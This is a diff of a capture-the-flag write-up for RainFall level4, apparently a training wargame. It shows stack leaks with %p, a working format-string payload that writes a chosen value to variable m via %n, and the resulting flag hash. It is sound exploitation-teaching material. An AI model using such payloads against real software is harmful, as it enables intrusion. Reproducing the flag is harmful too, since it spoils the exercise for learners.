@@ -15,14 +15,16 @@ Looking at the disassembly with ghidra:
 
 -> We can just use the same technique as before
 
-# Figure out where the format string is in the stack
+Figure out where the format string is in the stack:
+
 level4@RainFall:~$ ./level4
 AAAA %p %p %p %p %p %p %p %p %p %p %p %p [...]
 AAAA 0xf7f05e24 0xffa82644 (nil) 0xf7eb3e1c 0xf7eb3e1c 0xffa825f8 0x804848d 0xffa823f0 0x200 0xf7eb4540 0xf7f1bfcc 0x41414141 [...]
 
 -> the 12th argument is our buffer (echo -ne 'AAAA%12$X\n' | ./level4)
 
-# Update m to match m == 0x1025544
-echo -ne '\x10\x98\x04\x08%16930112d%12$n\n' | ./level4
+Now, update m to match m == 0x1025544:
 
-> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+level4@RainFall:~$ echo -ne '\x10\x98\x04\x08%16930112d%12$n\n' | ./level4
+(...)
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
